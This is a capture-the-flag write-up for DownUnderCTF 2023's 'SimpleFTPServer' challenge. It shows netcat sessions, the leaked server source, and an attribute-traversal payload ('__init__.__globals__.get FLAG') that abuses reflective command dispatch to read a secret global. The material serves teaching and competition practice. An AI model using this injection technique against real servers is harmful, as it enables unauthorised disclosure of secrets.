# DownUnderCTF 2023

## SimpleFTPServer

> It always confused me why python had a simple HTTP server, but never a simple FTP server. So I made my own!
> 
> I hope I didn't leave secrets open to the global internet...
>
>  Author: BootlegSorcery@
>

Tags: _misc_

## Solution
For this challenge i got blood \o/

![](first.png)

All right, moving on. We don't have any attachment for this challenge, only a host and a port. Connecting with netcat we can enter some simple ftp commands.

```bash
$ nc 2023.ductf.dev 30029
220 vsFTPd (v2.3.4) ready...
LIST
150 Here comes the directory listing.
drwxr-xr-x 1 user group 4096 Aug 04 02:02 usr
drwxr-xr-x 1 user group 4096 Aug 04 02:06 lib64
drwxr-xr-x 1 user group 4096 Aug 21 01:13 lib
drwxr-xr-x 1 user group 4096 Aug 21 01:14 bin
drwxr-xr-x 1 user group 4096 Aug 21 01:12 kctf
drwxr-xr-x 1 user group 4096 Aug 30 04:23 chal
226 Directory send OK.
CWD chal
250 OK.
LIST
150 Here comes the directory listing.
-rwxr-xr-x 1 user group 7151 Aug 30 04:23 pwn
-rw-r--r-- 1 user group 27 Aug 31 02:14 flag.txt
226 Directory send OK.
RETR flag.txt
150 Opening data connection.
226 Transfer complete.
DUCTF{- Actually no, I don't feel like giving that up yet. ;)
```

Ok, that would have been too easy. But how to proceed? Next we can observer, that, if we enter unsupported commands the response is as following:

```bash
HELP
500 Sorry. 'FTPServerThread' object has no attribute 'HELP'
```

A quick google for `FTPServerThread` leads to a github [`repository`](https://gist.github.com/scturtle/1035886). This is interesting, as this seems to be the source of the ftp (or at least the ftp seems to be based on this source). This gives us a full list of commands but it doesnt lead to anything useful.

What else? Maybe we try to fetch the second file in `chal`.

```bash
RETR pwn
150 Opening data connection.
226 Transfer complete.
#!/usr/bin/env python3
# Adapted from: https://gist.github.com/ZoeS17/467387af22de19c028f0430dcfc5ada8#file-ftpserver-py-L83
# FTP spec comments borrowed from Wikipedia

import os,time,operator,sys
allow_delete = False
local_ip = '0.0.0.0'
local_port = 1337
currdir = os.path.abspath('.')
ENCODING = "utf-8"
```

This is nice, it leaks the (adapted) source code of the ftp server. Inspecting the code we can see a few comments and also that functionality was disabled, like copying files etc.. This all looks well but nothing really helps. 

Since no of the command handlers seem to be helpful we take a step back and look at how user input is handled.

```python
func=operator.attrgetter(cmd)(self)
msg = func(args)
```

This looks interesting, there is no hardcoded list of command handler functions but reflections are used with the user input. This means we basically can lookup and run any functionality.

To build the payload I ran the code locally and put in a few `print` statement to follow what happens. But what are we looking for? If we scroll up a bit, we can see that the flag is read into a global variable `FLAG`. What we ideally want to have is a way to read the value of `FLAG` and pass it to `msg` so it is printed for us.

After a while I found the following payload to be working: `__init__.__globals__.get FLAG`.

```bash
$ nc 2023.ductf.dev 30029
220 vsFTPd (v2.3.4) ready...
__init__.__globals__.get FLAG
DUCTF{15_this_4_j41lbr34k?}
```

Flag `DUCTF{15_this_4_j41lbr34k?}`